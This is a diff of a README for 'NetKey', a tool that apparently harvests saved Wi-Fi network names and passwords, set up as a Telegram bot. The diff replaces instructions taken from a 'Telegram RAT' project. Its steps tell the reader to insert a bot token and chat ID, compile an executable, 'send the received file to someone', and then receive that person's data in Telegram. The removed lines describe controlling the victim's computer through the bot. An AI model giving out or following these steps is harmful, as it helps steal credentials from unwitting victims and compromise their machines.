@@ -19,21 +19,18 @@ NetKey is a simple utility for obtaining passwords and network names of wireless
   ![](images/chatidBot.jpg)  
 * Now you need to download [Python](https://www.python.org/)  
   ![](images/python.jpg)  
-* Download the [source code](https://github.com/cisamu123/CyberEye/archive/refs/heads/main.zip) of this program.  
-  ![](images/loadSourceCode.JPG)  
-* Unzip the “Telegram RAT” folder to your desktop.  
-* Open the TelegramRAT.sln file through Visual Studio.  
-* Open file config.cs in project.  
-  ![](images/openConfig.JPG)  
+* Download the [source code](https://github.com/cisamu123/NetKey/archive/refs/heads/main.zip) of this program.  
+  ![](images/loadSourceCode.jpg)
+* Unzip the project folder to your desktop.  
+* Open the NetKey.py file through IDE or notepad.  
+* Change the value of TOKEN and CHAT_ID in NetKey.py
+  ![](images/config.jpg)  
 * Insert your token from the bot and your chatID that you received earlier.  
-* Above you need to select ”Release”.  
-  ![](images/saveConfig.JPG)  
-* Press CTRL + S to save. And CTRL + B to compile everything into an executable file.  
-  ![](images/build.JPG)   
+* Press CTRL + S to save and start the file called Compile.bat to compile everything into an executable file.
 * You can send the received file to someone.  
-* After starting the file, you can control the computer through the bot.  
-  ![](images/openMalware.JPG)  
-* Write `/help` to see all available commands.  
+* After starting the file, data will be sent to your Telegram account from the bot.
+  ![](images/Telegram.png)
+  ![](images/xml.png) 
 
 # :moneybag: Donate:
 **BTC:** `bc1q5exw2v9sa0yktp2t7xnq8ma2xpn5a29s7w283y`  
